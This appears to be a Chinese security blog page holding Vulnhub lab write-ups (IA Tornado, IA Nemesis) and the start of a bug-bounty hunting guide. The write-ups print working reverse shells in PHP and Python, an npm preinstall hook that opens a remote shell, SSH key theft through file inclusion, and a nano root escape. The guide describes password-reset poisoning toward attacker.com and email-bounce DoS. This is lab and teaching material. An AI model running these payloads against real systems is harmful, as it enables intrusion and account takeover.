<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.56.102&quot;,9002);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br><span class="line"></span><br><span class="line">nc -lvnp 9002</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/IA-Tornado/18.png" alt="image-"></p>
</blockquote>
<h3><span id="初步提权">初步提权</span></h3><blockquote>
<p>1.查看可用文件权限，发现npm可以使用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p>2.先在kali下写一个json文件，如package.json，开启http服务：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vim package.json</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jin&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;follow jin on medium and twitter&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;index.js&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;preinstall&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|telnet 192.168.56.102 9003 &gt; /tmp/f&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">python3 -m http.server <span class="number">8001</span></span><br></pre></td></tr></table></figure>

<p>3.在靶机&#x2F;tmp目录下建立一个json目录，然后获取json文件，再利用npm触发shell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">mkdir jin</span><br><span class="line">wget http://192.168.56.102:8001/package.json</span><br><span class="line">mv package.json jin</span><br><span class="line">chmod +s jin/</span><br><span class="line"></span><br><span class="line">sudo -u catchme /usr/bin/npm i /tmp/jin — unsafe</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/IA-Tornado/19.png" alt="image-"><br><img src="/2022/08/15/IA-Tornado/20.png" alt="image-"></p>
<p><img src="/2022/08/15/IA-Tornado/21.png" alt="image-"></p>
<p>4.可以成功地在catchme用户目录下找到第一个flag，user.txt：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">ls -al</span><br><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/IA-Tornado/22.png" alt="image-"></p>
</blockquote>
<h3><span id="root提权">root提权</span></h3><blockquote>
<p>1.查看同目录下的enc.py文件，发现是个加密程序，告知我们密文，粗略阅读程序，明显是凯撒密码的变种，我们利用<a target="_blank" rel="noopener" href="https://www.boxentriq.com/code-breaking/caesar-cipher%EF%BC%8C%E4%B8%8D%E4%BD%BF%E7%94%A8key%E8%87%AA%E5%8A%A8%E7%A0%B4%E8%A7%A3%EF%BC%9A">https://www.boxentriq.com/code-breaking/caesar-cipher，不使用key自动破解：</a></p>
<p><img src="/2022/08/15/IA-Tornado/23.png" alt="image-"></p>
<p><img src="/2022/08/15/IA-Tornado/24.png" alt="image-"></p>
<p>2.但自动破解出来的并不是密码，但非常接近了，我们回看程序，对比自动解出的字串，得到key是u，而w是在u后的字符，不应该变化，可分析出最后密码是idkrootpassword：</p>
<p><img src="/2022/08/15/IA-Tornado/25.png" alt="image-"></p>
<p>3.最后能在&#x2F;root目录下发现第二个flag，root.txt：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -al</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/IA-Tornado/26.png" alt="image-"></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/IA/" rel="tag">IA</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2022/08/15/IA-Nemesis/">
                IA Nemesis
            </a>
        </h2>
    
    <time>
        Aug 15, 2022
    </time>
    <section class="content">
        <h1><span id="ia-nemesis-101">IA: NEMESIS (1.0.1)</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
<h4><span id="名称ia-nemesis-101">名称：IA: Nemesis (1.0.1)</span></h4><h4><span id="发布日期20201025">发布日期：2020.10.25</span></h4><h4><span id="作者infosec-articles">作者：InfoSec Articles</span></h4><h4><span id="系列ia">系列：IA</span></h4><h4><span id="推特-infosecarticles">推特: @infosecarticles</span></h4></blockquote>
<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
<h4><span id="flags">Flags：</span></h4><p>thanos:&#x2F;<del>&#x2F;flag1.txt<br>carlos:&#x2F;</del>&#x2F;flag2.txt<br>root:&#x2F;root&#x2F;root.txt </p>
<h4><span id="难度困难">难度：困难</span></h4></blockquote>
<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
<h4><span id="文件名nemesis-v101ova">文件名：Nemesis-v1.0.1.ova</span></h4><h4><span id="文件大小537mb">文件大小：537MB</span></h4><h4><span id="下载地址httpsdownloadvulnhubcomianemesis-v101ova">下载地址：</span></h4><h4><span id="md5-1e1b81a4b2af9a2bac30ed2b26b779bb">MD5: 1E1B81A4B2AF9A2BAC30ED2B26B779BB</span></h4><h4><span id="sha1-182f226ebd925575f50f24d04c515df79424775e">SHA1: 182F226EBD925575F50F24D04C515DF79424775E</span></h4></blockquote>
<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
<p>1.将靶机Nemesis和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
<p><img src="/2022/08/15/IA-Nemesis/1.png" alt="image-"></p>
</blockquote>
<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/IA-Nemesis/2.png" alt="image-"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/IA-Nemesis/3.png" alt="image-"></p>
<p>2.再进行端口扫描，发现开放了80，52845和52846端口，访问主页，在sign up页的validate函数可以发现登录的用户和密码，登录之后没有可用信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.131 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/IA-Nemesis/4.png" alt="image-"></p>
<p><img src="/2022/08/15/IA-Nemesis/5.png" alt="image-"></p>
<p><img src="/2022/08/15/IA-Nemesis/8.png" alt="image-"></p>
<p>3.最后再进行一下目录扫描，发现robots.txt文件，提示我们去寻找可用的攻击点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.131 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/IA-Nemesis/6.png" alt="image-"></p>
<p><img src="/2022/08/15/IA-Nemesis/7.png" alt="image-"></p>
</blockquote>
<h3><span id="文件包含漏洞利用">文件包含漏洞利用</span></h3><blockquote>
<p>1.我们接着访问52845端口，网页源码没有过多发现：</p>
<p><img src="/2022/08/15/IA-Nemesis/9.png" alt="image-"></p>
<p>2.在Contact Us页发现在Message框内输入任何信息都会收到写入文件的提示，测试后发现确实存在文件包含漏洞：</p>
<p><img src="/2022/08/15/IA-Nemesis/10.png" alt="image-"></p>
<p><img src="/2022/08/15/IA-Nemesis/11.png" alt="image-"></p>
<p>3.发现靶机存在thanos用户，可以尝试获取其ssh密钥：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/thanos/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/IA-Nemesis/12.png" alt="image-"></p>
<p>4.将thanos用户ssh私钥获取到kali后，ssh登录thanos用户：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 400 id</span><br><span class="line">ssh thanos@192.168.56.131 -p 52846 -i id</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/IA-Nemesis/13.png" alt="image-"></p>
<p>5.登录后可在用户目录下发现第一个flag，即flag1.txt：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -al</span><br><span class="line">cat flag1.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/IA-Nemesis/14.png" alt="image-"></p>
</blockquote>
<h3><span id="初步提权">初步提权</span></h3><blockquote>
<p>1.我们可以在thanos用户目录下发现属于carlos用户的backup.py：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat backup.py</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/IA-Nemesis/15.png" alt="image-"></p>
<p>2.通过利用pspy64s工具，可以发现backup.py是被定时调用的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8001，kali开启http服务</span><br><span class="line"></span><br><span class="line">wget http://192.168.56.102:8001/pspy64s，thanos获取pspy64s工具</span><br><span class="line">chmod +x pspy64s</span><br><span class="line">./pspy64s</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/IA-Nemesis/16.png" alt="image-"></p>
<p>3.那我们只需要把原backup.py重命名（因为我们没有修改其内容的权限），重新写入一个backup.py，内容为反弹shell就可以：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mv backup.py backup_original.py</span><br><span class="line">vi backup.py</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;192.168.56.102&quot;</span>,<span class="number">9002</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>])</span><br><span class="line"></span><br><span class="line">nc -lvnp <span class="number">9002</span>，kali开启对应端口监听</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/IA-Nemesis/17.png" alt="image-"></p>
<p>4.可以在carlos用户目录下发现第二个flag，即flag2.txt：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -al</span><br><span class="line">cat flag2.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/IA-Nemesis/18.png" alt="image-"></p>
</blockquote>
<h3><span id="root提权">root提权</span></h3><blockquote>
<p>1.同时在carlos用户目录下还能发现root.txt，查看后是让我们去分析encrypt.py文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/IA-Nemesis/19.png" alt="image-"></p>
<p>2.查看encrypt.py文件后，联系root.txt，通过位置对应我们能知道FUN的密文是QZA，则可写出解密程序：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat encrypt.py</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/IA-Nemesis/20.png" alt="image-"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先确定key为key[89, 65]</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">affine_encrypt</span>(<span class="params">text, key</span>):</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([ <span class="built_in">chr</span>((( key[<span class="number">0</span>]*(<span class="built_in">ord</span>(t) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)) + key[<span class="number">1</span>] ) % <span class="number">26</span>) + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)) <span class="keyword">for</span> t <span class="keyword">in</span> text.upper().replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>) ])</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">      affine_text=<span class="string">&quot;FUN&quot;</span></span><br><span class="line">      <span class="keyword">for</span> key0 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>):</span><br><span class="line">          <span class="keyword">for</span> key1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>):</span><br><span class="line">              encrypt_text = affine_encrypt(affine_text, [key0, key1])</span><br><span class="line">              <span class="keyword">if</span> encrypt_text == <span class="string">&quot;QZA&quot;</span>:</span><br><span class="line">                  <span class="built_in">print</span>(key0,key1)</span><br><span class="line">                  sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密程序，得到password为ENCRYPTIONISFUNPASSWORD</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">affine_decrypt</span>(<span class="params">cipher</span>):</span><br><span class="line">  text = []</span><br><span class="line">  <span class="keyword">for</span> t <span class="keyword">in</span> cipher:</span><br><span class="line">      b = <span class="built_in">ord</span>(t) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">      <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">          result = (<span class="number">65</span> + x*<span class="number">89</span> - b) % <span class="number">26</span></span><br><span class="line">          <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">              text.append(<span class="built_in">chr</span>(x + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)))</span><br><span class="line">              <span class="keyword">break</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(text))</span><br><span class="line">   </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">  affine_encrypted_text = <span class="string">&quot;FAJSRWOXLAXDQZAWNDDVLSU&quot;</span></span><br><span class="line">  affine_decrypt(affine_encrypted_text)</span><br></pre></td></tr></table></figure>

<p>3.再进行文件权限查看，发现可以使用nano进行提权：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/IA-Nemesis/21.png" alt="image-"></p>
<p>4.在gtfobins上查询nano提权方式，成功提权到root：</p>
<p><img src="/2022/08/15/IA-Nemesis/22.png" alt="image-"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su carlos，在thanos用户下登录到carlos，password是ENCRYPTIONISFUNPASSWORD</span><br><span class="line">sudo -u root /bin/nano /opt/priv</span><br><span class="line">ctrl+r,ctrl+x</span><br><span class="line">reset; sh 1&gt;&amp;0 2&gt;&amp;0</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/IA-Nemesis/23.png" alt="image-"></p>
<p>5.在&#x2F;root目录下可以发现第三个flag，即root.txt：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -al</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/IA-Nemesis/24.png" alt="image-"></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/IA/" rel="tag">IA</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2022/08/09/Ice-cream-Angle/">
                雪糕角度
            </a>
        </h2>
    
    <time>
        Aug 9, 2022
    </time>
    <section class="content">
        <h1><span id="雪糕角度">雪糕角度</span></h1><blockquote>
<p><img src="/2022/08/09/Ice-cream-Angle/1.jpg" alt="image"></p>
<p>午饭小憩时，看到公司商业区小卖部的冰柜望而却步 (lll￢ω￢)</p>
<p><img src="/2022/08/09/Ice-cream-Angle/2.jpg" alt="image"></p>
<p>今天学习 SRC 相关内容的时候，看到 DoS 的引例视频<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=5drIMXCQuNw">Commonly Misunderstood Bugs: DDoS &amp; DOS</a> 中，Michael Skelton 说：<br>“你报告的漏洞不能只影响你的个人账户，还要想办法能够影响到其他的用户”<br>想来很有道理：潜移默化或不择手段地影响他人，才是标准，才是正确思路，这甚至比单独破坏企业设施更有意义。</p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Chaos/" rel="tag">Chaos</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2022/08/09/How-To-Hunt/">
                SRC 发掘之旅
            </a>
        </h2>
    
    <time>
        Aug 9, 2022
    </time>
    <section class="content">
        <h1><span id="斯卡蒂的赏金猎人之旅src">斯卡蒂的赏金猎人之旅（SRC）</span></h1><blockquote>
<p>本文实际上是在 <a target="_blank" rel="noopener" href="https://kathan19.gitbook.io/howtohunt/">HowToHunt</a><br>的基础上结合自己在安全学习工作的经验，算是译写的一份 SRC<br>初步指南，有时间学习 SRC 发掘应该就会更新（大概？）。</p>
</blockquote>
<ul>
<li><a href="#%E6%96%AF%E5%8D%A1%E8%92%82%E7%9A%84%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA%E4%B9%8B%E6%97%85src">斯卡蒂的赏金猎人之旅（SRC）</a><ul>
<li><a href="#%E5%A6%82%E4%BD%95%E5%8F%91%E7%8E%B0%E7%8C%8E%E7%89%A9how-to-hunt">如何发现猎物？（How To Hunt?）</a><ul>
<li><a href="#%E8%B4%A6%E6%88%B7%E6%8E%A7%E5%88%B6account-takeovers-methods">账户控制（account takeovers methods）</a></li>
<li><a href="#%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%BA%A7-dosapplication-level-dos-methods">应用程序级 DoS（Application Level DoS Methods）</a></li>
<li><a href="#%E7%BB%95%E8%BF%87%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81authentication-bypass">绕过身份验证（Authentication Bypass）</a></li>
<li><a href="#%E4%BA%8C%E6%AC%A1%E8%AE%A4%E8%AF%812fa%E7%BB%95%E8%BF%87">二次认证（2FA）绕过</a></li>
<li><a href="#%E4%B8%80%E6%AC%A1%E6%80%A7%E5%AF%86%E7%A0%81%E5%8A%A8%E6%80%81%E5%AF%86%E7%A0%81otp%E7%BB%95%E8%BF%87">一次性密码&#x2F;动态密码（OTP）绕过</a></li>
<li><a href="#%E5%88%A9%E7%94%A8%E6%96%AD%E5%BC%80%E9%93%BE%E6%8E%A5%E5%8A%AB%E6%8C%81broken-link-hijacking">利用断开链接劫持（Broken-Link Hijacking）</a></li>
<li><a href="#%E7%94%B1%E4%BC%9A%E8%AF%9D%E8%A1%8D%E7%94%9F%E7%9A%84%E9%97%AE%E9%A2%98session-based-bugs">由会话衍生的问题（Session Based Bugs）</a></li>
<li><a href="#%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fcms">内容管理系统（CMS）</a></li>
<li><a href="#%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%ABcors">跨域资源共享（CORS）</a></li>
<li><a href="#csrf">CSRF</a></li>
<li><a href="#%E5%AF%BB%E6%89%BE-cvefinding-cves">寻找 CVE（finding CVES）</a></li>
<li><a href="#web-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A3%80%E6%B5%8B%E6%B8%85%E5%8D%95">Web应用程序渗透测试检测清单</a></li>
<li><a href="#%E7%BD%91%E9%A1%B5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1web-page-source-code-review">网页代码审计（Web Page Source Code Review）</a></li>
<li><a href="#%E6%B2%A1%E6%9C%89%E5%89%A5%E7%A6%BB%E7%9A%84-exif-%E5%9C%B0%E7%90%86%E6%95%B0%E6%8D%AEexif-geo-data-not-stripped">没有剥离的 EXIF 地理数据（EXIF Geo Data Not Stripped）</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87file-upload-bypass">文件上传绕过（File Upload Bypass）</a></li>
<li><a href="#%E6%BA%AF%E6%BA%90find-origin">溯源（Find Origin）</a></li>
<li><a href="#graphql">GraphQL</a></li>
<li><a href="#http-%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9Ehttp_desync-attack">HTTP 走私漏洞（HTTP_Desync Attack）</a></li>
<li><a href="#host-header-attack">Host-Header Attack</a></li>
<li><a href="#html-injection">HTML-Injection</a></li>
<li><a href="#idor">IDOR</a></li>
<li><a href="#jwt">JWT</a></li>
<li><a href="#%E6%9C%AA%E5%AE%8C%E5%BE%85%E7%BB%AD">未完待续</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2><span id="如何发现猎物how-to-hunt">如何发现猎物？（How To Hunt?）</span></h2><h3><span id="账户控制account-takeovers-methods">账户控制（account takeovers methods）</span></h3><h4><span id="xss-cookie-劫持">XSS cookie 劫持</span></h4><blockquote>
<ol>
<li>在身份验证与会话管理过程中尝试进行劫持；</li>
<li>利用 XSS 等方法尝试去窃取 cookie，从而达到控制账户的目的。</li>
</ol>
</blockquote>
<h4><span id="弱密码与登录次数">弱密码与登录次数</span></h4><blockquote>
<ol>
<li>如果一个登录页没有对密码复杂度进行严格要求，或可以尝试弱密码与初始&#x2F;管理账户登录（admin&#x2F;password）；</li>
<li>如果一个登录页没有对一定时间内的登录次数进行限制，可以尝试初步爆破以致SQL注入。</li>
</ol>
</blockquote>
<h4><span id="窃取重置密码凭证token">窃取重置密码凭证（token）</span></h4><blockquote>
<ol>
<li>对可疑站点进行账户密码修改的操作；</li>
<li>利用 BurpSuite 拦截修改请求，并修改包 header 中的 host 值，如：</li>
</ol>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Host: target.com</span><br><span class="line">Host: attacker.com</span><br></pre></td></tr></table></figure>

<blockquote>
<p>也可以尝试在不修改 host的情况下在 header 中加入一些字段：</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-Host: attacker.com</span><br><span class="line">Referrer: https://attacker.com</span><br></pre></td></tr></table></figure>

<blockquote>
<ol start="3">
<li>放行发送这个包，如果你在 attacker.com 接下来的 log<br>中发现了请求，说明你已经成功窃取了这个 token。</li>
</ol>
<p>详见<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning">Password reset<br>poisoning</a></p>
</blockquote>
<h4><span id="尝试-csrf">尝试 CSRF</span></h4><blockquote>
<ol>
<li>修改密码处</li>
<li>修改邮箱处</li>
<li>修改账号安全问题处</li>
</ol>
</blockquote>
<h4><span id="响应包令牌泄露">响应包令牌泄露</span></h4><blockquote>
<p>在注册页或密码重置页： 1. 拦截提交的请求包； 2. Proxy - Intercept -<br>右键 - 拦截执行（Do intercept） - 此请求的响应（Response to this<br>request），即拦截 response； 3. 放行 request，查看 response<br>中是否有任何链接、凭证（token）或 一次性密码&#x2F;动态密码（OTP）。</p>
</blockquote>
<h3><span id="应用程序级-dosapplication-level-dos-methods">应用程序级 DoS（Application Level DoS Methods）</span></h3><h4><span id="邮件退回攻击">邮件退回攻击</span></h4><blockquote>
<ol>
<li>查看应用程序是否具有群发功能；</li>
<li>伪装需要攻击的邮箱地址作为发件人（如小公司自建企业邮箱）；</li>
<li>向无效的电子邮件账户群发大量邮件；</li>
<li>查看电子邮件服务供应商的退信限制上限；</li>
<li>达到这个退信限制后，被伪造的发件人公司将在一定时间内无法再次发送邮件。</li>
</ol>
<p>推荐先用<a target="_blank" rel="noopener" href="https://github.com/domainaware/checkdmarc">checkdmarc</a>测一下有没有<br>SPF<br>等策略，有的话不同邮箱域名间伪造很可能被拦截，当然也看技术手法，我之后也应该会更新一篇详细介绍邮件伪造的<del>（咕咕咕）</del>。<br>* 参考 <a target="_blank" rel="noopener" href="https://infosecwriteups.com/an-unexpected-bounty-email-bounce-issues-b9f24a35eb68">An Unexpected Bounty — Email Bounce<br>Issues</a></p>
</blockquote>
<h4><span id="长密码拒绝服务">长密码拒绝服务</span></h4><blockquote>
<p>密码明文理应被哈希加盐后存储在数据库中，如果没有对密码长度进行限制，那么过长的密码在进行哈希运算时就可能消耗大量的资源。<br>* 测试方式： 1. 用长度150-200字的密码测试是否有长度限制； 2.<br>如果没有，换更长的密码测试，关注一下页面响应的时间； 3.<br>甚至可以看看会不会崩溃。</p>
<ul>
<li>测试点：</li>
</ul>
<ol>
<li>很多页面在注册时限制了密码长度，但是在忘记密码和修改密码的地方遗漏了这个限制。</li>
</ol>
